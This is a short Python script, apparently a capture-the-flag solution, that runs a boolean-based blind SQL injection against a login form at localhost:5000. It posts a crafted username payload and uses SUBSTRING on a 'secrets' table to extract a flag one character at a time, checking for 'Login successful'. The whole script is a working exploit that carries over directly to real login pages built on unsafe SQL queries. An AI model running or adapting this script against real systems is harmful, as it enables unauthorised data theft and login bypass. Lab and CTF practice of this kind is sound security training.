import requests

url = "http://localhost:5000"
flag = ""
charset = "FLAG{abcdefghijklmnopqrstuvwxyz0123456789_}"

for i in range(1, 30):  # Guess up to 30 chars
    for char in charset:
        payload = f"admin' AND SUBSTRING((SELECT flag FROM secrets LIMIT 1), {i}, 1)='{char}' --"
        data = {"username": payload, "password": "test"}
        r = requests.post(url, data=data)
        if "Login successful" in r.text:
            flag += char
            print(f"Flag so far: {flag}")
            break